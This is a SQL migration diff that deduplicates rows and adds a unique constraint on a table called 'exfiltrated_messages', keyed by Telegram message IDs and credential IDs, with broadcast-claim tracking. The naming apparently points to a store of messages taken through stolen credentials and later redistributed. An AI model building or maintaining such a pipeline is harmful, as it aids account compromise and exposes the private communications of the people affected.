@@ -12,33 +12,42 @@ CREATE INDEX IF NOT EXISTS idx_exfiltrated_messages_claimed
 ON exfiltrated_messages (is_broadcasted, broadcast_claimed_at);
 
 -- =================================================
--- CLEANUP EXISTING DATA
+-- FIX DUPLICATE ISSUE: Add UNIQUE constraint
 -- =================================================
 
--- 3. Clear ALL existing claims to start fresh
-UPDATE exfiltrated_messages 
-SET broadcast_claimed_at = NULL;
-
--- 4. OPTIONAL: If you have duplicates in DB (same telegram_msg_id + credential_id)
--- This marks duplicates as broadcasted so they won't be sent again
--- Keep only the oldest row for each unique combo
-WITH duplicates AS (
-    SELECT id 
-    FROM (
-        SELECT id, 
+-- 3. FIRST: Remove duplicate rows (keep oldest, delete newer)
+-- This is REQUIRED before we can add the unique constraint
+DELETE FROM exfiltrated_messages 
+WHERE id IN (
+    SELECT id FROM (
+        SELECT id,
                ROW_NUMBER() OVER (
-                   PARTITION BY telegram_msg_id, credential_id 
+                   PARTITION BY credential_id, telegram_msg_id 
                    ORDER BY created_at ASC
                ) as rn
         FROM exfiltrated_messages
     ) sub
     WHERE rn > 1
-)
-UPDATE exfiltrated_messages 
-SET is_broadcasted = TRUE 
-WHERE id IN (SELECT id FROM duplicates);
+);
 
--- 5. Show current status
+-- 4. Now add UNIQUE constraint to PREVENT future duplicates
+-- (The index exists but index ≠ unique constraint!)
+ALTER TABLE exfiltrated_messages 
+DROP CONSTRAINT IF EXISTS unique_msg_per_credential;
+
+ALTER TABLE exfiltrated_messages 
+ADD CONSTRAINT unique_msg_per_credential 
+UNIQUE (credential_id, telegram_msg_id);
+
+-- =================================================
+-- CLEANUP EXISTING DATA
+-- =================================================
+
+-- 5. Clear ALL existing claims to start fresh
+UPDATE exfiltrated_messages 
+SET broadcast_claimed_at = NULL;
+
+-- 6. Show current status
 SELECT 
     is_broadcasted,
     COUNT(*) as count
